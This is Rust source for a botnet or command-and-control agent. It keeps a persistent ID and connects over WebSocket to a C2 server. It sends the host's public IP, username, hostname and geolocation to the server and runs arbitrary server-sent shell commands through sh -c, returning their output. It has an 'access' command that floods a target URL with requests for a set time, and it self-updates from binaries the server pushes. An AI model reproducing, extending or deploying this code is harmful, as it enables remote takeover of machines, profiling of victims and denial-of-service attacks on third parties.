use std::time::Duration;

use crate::handlers::models::{Agent as C2Agent, C2Message, Location};
use futures::prelude::*;
use hostname::get as hostname;
use reqwest::Client;
use serde_json::Value;
use std::os::unix::fs::PermissionsExt;
use tokio::process::Command;
use tokio::time::timeout;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::{MaybeTlsStream, WebSocketStream};
use uuid::Uuid;

pub struct Agent {
    uuid: String,
    ws: WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
    client: Client,
}

const AGENT_VERSION: &str = "1.0.1"; // Versão atual do agente

fn is_agent_up_to_date(version: &str) -> bool {
    version == AGENT_VERSION
}

impl Agent {
    pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let mut uuid = String::new();
        let config_dir = match dirs::home_dir() {
            Some(path) => path.join(".unique_id"),
            None => {
                uuid = Uuid::new_v4().to_string();
                eprintln!(
                    "Could not find home directory. Generating random UUID: {}",
                    uuid
                );
                return Err("Could not find home directory".into());
            }
        };

        if !config_dir.exists() {
            uuid = Uuid::new_v4().to_string();
            std::fs::write(&config_dir, &uuid)?;
            eprintln!("Generated and saved new UUID: {}", uuid);
        } else {
            uuid = std::fs::read_to_string(&config_dir)?;
            eprintln!("Loaded UUID from file: {}", uuid);
        }

        let client = Client::builder().timeout(Duration::from_secs(10)).build()?;
        let (ws, _) = tokio_tungstenite::connect_async("ws://localhost:80/c2").await?;

        Ok(Agent { uuid, ws, client })
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        loop {
            // Enviar VersionCheck ao conectar
            let version_check_msg = serde_json::to_string(&C2Message::VersionCheck {
                uuid: self.uuid.clone(),
                agent_version: AGENT_VERSION.to_string(),
            })?;
            eprintln!(
                "Agent {} sending VersionCheck: {}",
                self.uuid, version_check_msg
            );
            self.ws.send(Message::text(version_check_msg)).await?;

            // Aguardar VersionResponse ou UpdateSoftwareWithBinary
            let mut version_checked = false;
            let mut attempts = 0;
            const MAX_ATTEMPTS: u32 = 3;

            while attempts < MAX_ATTEMPTS && !version_checked {
                attempts += 1;
                eprintln!(
                    "Agent {}: waiting for version response, attempt {}/{}",
                    self.uuid, attempts, MAX_ATTEMPTS
                );
                match timeout(Duration::from_secs(30), self.ws.next()).await {
                    Ok(Some(Ok(msg))) => {
                        eprintln!("Agent {}: received message from server", self.uuid);
                        if let Ok(text) = msg.into_text() {
                            eprintln!("Agent {}: received text: {}", self.uuid, text);
                            if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                                match c2_msg {
                                    C2Message::VersionResponse { version } => {
                                        eprintln!(
                                            "Agent {} received VersionResponse: version={}",
                                            self.uuid, version
                                        );
                                        if !is_agent_up_to_date(&version) {
                                            eprintln!("Version mismatch, waiting for update...");
                                            continue;
                                        }
                                        version_checked = true;
                                        let ack_msg =
                                            serde_json::to_string(&C2Message::VersionCheckAck {})?;
                                        eprintln!(
                                            "Agent {} sending VersionCheckAck: {}",
                                            self.uuid, ack_msg
                                        );
                                        self.ws.send(Message::text(ack_msg)).await?;
                                        break;
                                    }
                                    C2Message::UpdateSoftwareWithBinary { version, binary } => {
                                        eprintln!("Received update for version {}", version);
                                        self.update_software(&version, binary).await?;
                                        return Err("Agent updated and restarting".into());
                                    }
                                    _ => {
                                        eprintln!(
                                            "Received unexpected message during version check: {:?}",
                                            c2_msg
                                        );
                                    }
                                }
                            } else {
                                eprintln!(
                                    "Agent {} failed to deserialize message: {}",
                                    self.uuid, text
                                );
                            }
                        } else {
                            eprintln!("Agent {} received non-text message", self.uuid);
                        }
                    }
                    Ok(Some(Err(e))) => {
                        eprintln!(
                            "Agent {}: WebSocket error while waiting for version response: {}",
                            self.uuid, e
                        );
                        break;
                    }
                    Ok(None) => {
                        eprintln!(
                            "Agent {}: WebSocket stream closed while waiting for version response",
                            self.uuid
                        );
                        break;
                    }
                    Err(_) => {
                        eprintln!(
                            "Agent {}: timeout waiting for version response, attempt {}/{}",
                            self.uuid, attempts, MAX_ATTEMPTS
                        );
                    }
                }
            }

            if !version_checked {
                eprintln!("Failed to verify version after {} attempts", MAX_ATTEMPTS);
                tokio::time::sleep(Duration::from_secs(5)).await;
                continue;
            }

            // Enviar registro após verificar a versão
            let ip = self
                .client
                .get("https://api.ipify.org/")
                .send()
                .await?
                .text()
                .await?;

            let username = whoami::username();

            let hostname = hostname()?.to_string_lossy().to_string();

            let location_response = self
                .client
                .get(format!("https://freeipapi.com/api/json/{}", ip))
                .send()
                .await?
                .text()
                .await?;

            let location_json: Value = serde_json::from_str(&location_response)?;
            let location = Location {
                country: location_json["countryName"]
                    .as_str()
                    .unwrap_or("Unknown")
                    .to_string(),
                city: location_json["cityName"]
                    .as_str()
                    .unwrap_or("Unknown")
                    .to_string(),
                region: location_json["regionName"]
                    .as_str()
                    .unwrap_or("Unknown")
                    .to_string(),
                latitude: location_json["latitude"].as_f64().unwrap_or(0.0),
                longitude: location_json["longitude"].as_f64().unwrap_or(0.0),
            };

            let register_msg = serde_json::to_string(&C2Message::AgentRegister {
                uuid: self.uuid.clone(),
                ip,
                username,
                hostname,
                country: location.country,
                city: location.city,
                region: location.region,
                latitude: location.latitude,
                longitude: location.longitude,
                version: AGENT_VERSION.to_string(),
            })?;
            eprintln!(
                "Agent {} sending register message: {}",
                self.uuid, register_msg
            );
            self.ws.send(Message::text(register_msg)).await?;

            // Processar mensagens do servidor
            while let Some(msg) = self.ws.next().await {
                match msg {
                    Ok(msg) => {
                        if let Ok(text) = msg.into_text() {
                            if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                                match c2_msg {
                                    C2Message::Ping => {
                                        self.ws
                                            .send(Message::text(serde_json::to_string(
                                                &C2Message::Pong,
                                            )?))
                                            .await?;
                                    }
                                    C2Message::Command { uuid, cmd } => {
                                        if uuid == self.uuid {
                                            if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
                                                if json["action"] == "access" {
                                                    let url = json["url"].as_str().unwrap_or("");
                                                    let secs =
                                                        json["duration_secs"].as_u64().unwrap_or(0);
                                                    let end_time = std::time::Instant::now()
                                                        + Duration::from_secs(secs);
                                                    while std::time::Instant::now() < end_time {
                                                        let _ = self.client.get(url).send().await;
                                                    }
                                                } else {
                                                    Command::new("sh")
                                                        .arg("-c")
                                                        .arg(&cmd)
                                                        .output()
                                                        .await?;
                                                }
                                            }
                                        }
                                    }
                                    C2Message::Broadcast { cmd } => {
                                        if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
                                            if json["action"] == "access" {
                                                let url = json["url"].as_str().unwrap_or_default();
                                                let secs =
                                                    json["duration_secs"].as_u64().unwrap_or(0);
                                                let end_time = std::time::Instant::now()
                                                    + Duration::from_secs(secs);
                                                while std::time::Instant::now() < end_time {
                                                    let output = match self.client.get(url).send().await {
                                                        Ok(resp) => resp.text().await.unwrap_or_else(|e| {
                                                            format!("Error on receiving response: {}", e)
                                                        }),
                                                        Err(e) => {
                                                            format!("Error on sending request: {}", e)
                                                        }
                                                    };

                                                    self.ws
                                                        .send(Message::text(serde_json::to_string(
                                                            &C2Message::CommandResponse { output },
                                                        )?))
                                                        .await?;
                                                    tokio::time::sleep(Duration::from_millis(100))
                                                        .await;
                                                }
                                            } else {
                                                let output: std::process::Output =
                                                    Command::new("sh")
                                                        .arg("-c")
                                                        .arg(&cmd)
                                                        .output()
                                                        .await?;
                                                let output =
                                                    String::from_utf8_lossy(&output.stdout)
                                                        .to_string();

                                                self.ws
                                                    .send(Message::text(serde_json::to_string(
                                                        &C2Message::CommandResponse { output },
                                                    )?))
                                                    .await?;
                                            }
                                        }
                                    }
                                    C2Message::UpdateSoftwareWithBinary { version, binary } => {
                                        self.update_software(&version, binary).await?;
                                        return Err("Agent updated and restarting".into());
                                    }
                                    _ => {}
                                }
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("WebSocket error: {}", e);
                        break;
                    }
                }
            }

            eprintln!("WebSocket connection closed. Retrying in 5 seconds...");
            tokio::time::sleep(Duration::from_secs(5)).await;
            let (ws, _) = tokio_tungstenite::connect_async("ws://localhost:80/c2").await?;
            self.ws = ws;
        }
    }

    async fn update_software(
        &mut self,
        version: &str,
        binary: Vec<u8>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let temp_path = "/tmp/agent_new";
        std::fs::write(temp_path, binary)?;

        let mut perms = std::fs::metadata(temp_path)?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(temp_path, perms)?;

        let current_exe = std::env::current_exe()?;

        let pid = std::process::id();
        let current_exe_path = current_exe.to_string_lossy().replace(" (deleted)", "");

        let command = format!(
            "sleep 3; kill {} ; mv '{}' '{}' ; '{}'",
            pid, temp_path, current_exe_path, current_exe_path
        );

        println!("Executing command: {}", command);

        Command::new("sh").arg("-c").arg(command).spawn()?;

        std::process::exit(0);
    }
}
